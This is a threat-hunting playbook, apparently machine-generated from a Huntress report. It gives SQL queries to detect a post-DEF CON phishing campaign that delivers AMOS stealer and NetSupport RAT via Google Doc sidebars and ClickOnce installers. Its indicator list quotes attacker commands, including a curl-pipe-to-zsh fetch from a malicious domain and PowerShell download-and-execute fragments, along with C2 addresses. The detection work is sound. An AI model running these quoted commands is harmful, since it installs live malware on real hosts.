---
analysis: A single rule on lure domains is trivial to bypass once the adversary rotates
  infrastructure. This hunt combines URI pattern analysis with fleet-wide stack-counting
  of ClickOnce installer execution, allowing an analyst to verify the legitimate nature
  of the application versus the reported phishing campaign.
blind_spots:
- id: visibility-gap-http
  owner: Network Engineering
  question: Can we see the specific URI path 'DecryptPanel.html' if it is loaded inside
    a Google Docs iframe via HTTPS?
  remediation: Implement TLS inspection on egress traffic to cloud productivity suites.
  requires: TLS Decryption / Proxy Logs
  risk: If traffic is encrypted and not inspected by a proxy, the specific HTML sidebar
    interaction may be invisible.
  stage: google-doc-apps-script-interaction
- id: clickonce-logging
  owner: Endpoint Security
  question: Does the EDR capture the full command line for dfsvc.exe containing the
    .application URL?
  remediation: Ensure process command line logging is enabled and not truncated for
    interpreter binaries.
  requires: hb_process_activity with process_cmd_line
  risk: If command lines are truncated or not captured, the .application lure indicator
    will be missed.
  stage: windows-clickonce-delivery
coverage:
- stage: google-doc-apps-script-interaction
  status: covered
  steps:
  - lure-interaction-http
  - dns-ioc-resolution
  - triage-lure-interactions
- stage: windows-clickonce-delivery
  status: covered
  steps:
  - lure-interaction-http
  - rare-clickonce-installers
  - triage-lure-interactions
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: social-engineering-outreach
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-payload-execution
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-powershell-loader
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-persistence-launchdaemon
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: amos-data-collection
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: c2-traffic-polling
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Conference attendees are high-value targets for credential theft
    and RAT delivery. Detecting the early interaction phase (sidebar load/installer
    download) is the most effective way to disrupt AMOS and NetSupport RAT before
    persistence is established.
  methodology: model-assisted
  trigger: intel-report
hypothesis: Adversaries are delivering malware via malicious Google Doc sidebars and
  ClickOnce installers, identifiable by specific URI patterns and rare .application
  file references in process command lines.
labels:
- hunt
- attack.t1059.007
- attack.t1204.002
- attack.t1218
name: Web-Based Delivery and Lure Interaction
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-08-19'
      ref: default
    type: number
  lure_domains:
    default:
    - apple-googleapi.com
    - gapidriver.com
    - 1foqo.lat
    - 2fksf.lat
    - 3pqow.lat
    description: Domains hosting malicious lures or installers.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress
    type: list[domain]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on endpoints (Windows and macOS) potentially belonging to conference
  attendees. Check logs starting from August 9, 2026.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: macos-payload-execution-amos
  reason: Focuses on the subsequent execution and data theft phase of the AMOS malware
    on macOS systems.
  relation: out-of-scope-alternative
- hunt: windows-powershell-loader-sleestak
  reason: Focuses on the PowerShell loader and secondary payloads (DockerDesktopSvc,
    etc.) delivered to Windows hosts.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Social Engineering via X DM
    observables:
    - X account @HartmansDoeke
    - Direct messages regarding conference planning
    - Links to Google Docs with custom access keys
    slug: social-engineering-outreach
    tactic: initial-access
    techniques:
    - T1566.003
  - name: Malicious Google Doc Sidebar
    observables:
    - DecryptPanel.html
    - Google Apps Script sidebar
    - Fake decryption failure prompts
    slug: google-doc-apps-script-interaction
    tactic: execution
    techniques:
    - T1059.007
  - name: macOS Script and DMG Execution
    observables:
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - apple-googleapi.com
    - gapiupdate.dmg
    - Bypassing macOS Gatekeeper via user instructions
    slug: macos-payload-execution
    tactic: execution
    techniques:
    - T1059.004
    - T1204.002
    - T1553.001
  - name: Windows ClickOnce Installer
    observables:
    - GapiUpdate.application
    - https://gapidriver.com/installer/GapiUpdate.application
    - gapidriver.com
    - Certificate issued to BARNEHAGEN GUNHILDS MINNE AS
    slug: windows-clickonce-delivery
    tactic: execution
    techniques:
    - T1204.002
    - T1218
  - name: Windows PowerShell Loader
    observables:
    - https://1foqo.lat/core4
    - '%TEMP%\sys.ps1'
    - Import-Module BitsTransfer
    - Invoke-WebRequest -OutFile $t -UseBasicParsing
    - Invoke-Expression (gc $t -Raw)
    slug: windows-powershell-loader
    tactic: execution
    techniques:
    - T1059.001
  - name: macOS LaunchDaemon Persistence
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - launchctl bootstrap
    - com.xdivcmp.plist
    slug: macos-persistence-launchdaemon
    tactic: persistence
    techniques:
    - T1543.001
  - name: AMOS Data Staging and Collection
    observables:
    - /tmp/lksopo
    - Notes.app database access
    - ~/.pwd (stolen user password file)
    - ~/.phost
    - ~/.bhost
    slug: amos-data-collection
    tactic: collection
    techniques:
    - T1005
    - T1555
    - T1119
  - name: C2 Communication and Polling
    observables:
    - 86.54.25.213
    - 192.253.248.181
    - http://86.54.25.213/log
    - /api/v1/bot/actions/
    - res10.php
    - res11.php
    - res12.php
    slug: c2-traffic-polling
    tactic: command-and-control
    techniques:
    - T1071.001
  summary: Threat actors use social engineering on X (Twitter) to lure targets into
    a malicious Google Doc featuring an Apps Script sidebar. This sidebar delivers
    OS-specific payloads, including AMOS stealer for macOS and NetSupport RAT for
    Windows, utilizing ClickFix-style prompts and fake installers to achieve persistence
    and data exfiltration.
series:
  index: 1
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# Web-Based Delivery and Lure Interaction

This hunt focuses on the initial interaction with malicious document lures. It identifies hosts that have loaded the 'DecryptPanel.html' sidebar within Google Docs or downloaded the 'GapiUpdate.application' ClickOnce installer. By stack-counting ClickOnce execution events across the fleet and correlating them with known malicious domains used in recent post-DEF CON phishing campaigns, we can identify compromised systems before full payload execution.

## scope-vulnerable-platforms
<!-- Scope to Vulnerable Platforms -->
Identify the estate of Windows and macOS hosts that are targeted by the reported AMOS and NetSupport RAT delivery chains.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hostnames representing the potential attack surface. Silence indicates
  no enrolled Windows or macOS devices.
reads:
- hostname
- platform
- device_uid
silence: not_evidence_of_absence
source: hb_devices
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT hostname, platform, device_uid FROM hb_devices WHERE LOWER(platform) IN ('windows', 'darwin')
```

## lure-interaction-http
<!-- HTTP Interaction with Malicious Lures -->
Identify hosts requesting the specific HTML sidebar or ClickOnce application file, checking both the path and query string.

```sqlite target=web role=detection-candidate params=(lookback_days=lookback_days, lure_domains=lure_domains)
~~~yaml
expected: Requests for DecryptPanel.html or GapiUpdate.application from any host.
  Silence suggests these specific lures haven't been accessed in the window.
reads:
- device_hostname
- url_hostname
- url_path
- url_query
- url_full
- user_agent
- time
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, url_hostname, url_path, url_query, url_full, user_agent, time FROM hb_http_activity WHERE (instr(LOWER(url_path), 'decryptpanel.html') > 0 OR instr(LOWER(url_query), 'decryptpanel.html') > 0 OR instr(LOWER(url_path), 'gapiupdate.application') > 0 OR instr(LOWER(url_query), 'gapiupdate.application') > 0 OR instr(',' || '{{lure_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## parallel-corroboration
<!-- Corroborate via DNS and Process Activity -->
parallel:
- → dns-ioc-resolution
- → rare-clickonce-installers
join: → triage-lure-interactions

## dns-ioc-resolution
<!-- DNS Resolution to Campaign Domains -->
Corroborate HTTP requests with DNS traffic to the specific domains named in the report.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days, lure_domains=lure_domains)
~~~yaml
expected: A host resolving any of the campaign domains. Silence means no DNS activity
  for these specific strings.
reads:
- device_hostname
- query_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, query_hostname, process_name, COUNT(*) as lookup_count, MIN(time) as first_seen FROM hb_dns_activity WHERE instr(',' || '{{lure_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname, process_name
```

## rare-clickonce-installers
<!-- Rare ClickOnce Installer Execution -->
Stack-count the execution of .application files, including when they appear in the command line of interpreters like dfsvc.exe.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Installers appearing on very few hosts. Single-host ClickOnce installers
  are high-interest as they often deliver custom loaders.
prevalence:
  by: device_hostname
  key:
  - installer_name
  - cmd_line
  rare_below: 3
reads:
- device_hostname
- process_name
- process_path
- process_cmd_line
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT LOWER(process_name) as installer_name, LOWER(process_cmd_line) as cmd_line, COUNT(DISTINCT device_hostname) as host_count, MIN(time) as first_seen FROM hb_process_activity WHERE (LOWER(process_name) LIKE '%.application' OR LOWER(process_path) LIKE '%.application' OR LOWER(process_cmd_line) LIKE '%.application%') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY installer_name, cmd_line HAVING host_count <= 3 ORDER BY host_count ASC
```

## triage-lure-interactions
<!-- Analyze Lure Interaction Context -->
```agent target=hunter
cite: required
context:
- lure-interaction-http
- dns-ioc-resolution
- rare-clickonce-installers
max_iterations: 4
objective: Determine if any host successfully downloaded or executed the malicious
  Google Doc sidebar or ClickOnce installer based on the gathered evidence.
success_criteria: A list of hosts categorized as 'Confirmed Interaction', 'Suspicious',
  or 'Benign'.
tools:
- endpoint
- web
```

## routing-verdict
<!-- Verdict Routing -->
if~: "the triage verdict is confirmed malicious or suspicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: visibility-gap-http)
else: → close-out

## isolate-host
<!-- Isolate Endpoint -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the identified host(s) from the network and proceed to full incident response for malware containment.
```
→ analyst-review

## analyst-review
<!-- Analyst Review of Interaction -->
```manual target=analyst
Verify the HTTP and DNS activity for the flagged hosts. Check if the .application files correspond to known legitimate software or the reported GapiUpdate lure. Confirm if url_query parameters match DecryptPanel operational data.
```
→ end

## close-out
<!-- Close Hunt -->
```manual target=analyst
Document that no interaction with the post-DEF CON phishing lures was detected for the period. Record any identified false positives from legitimate ClickOnce updates.
```
→ end
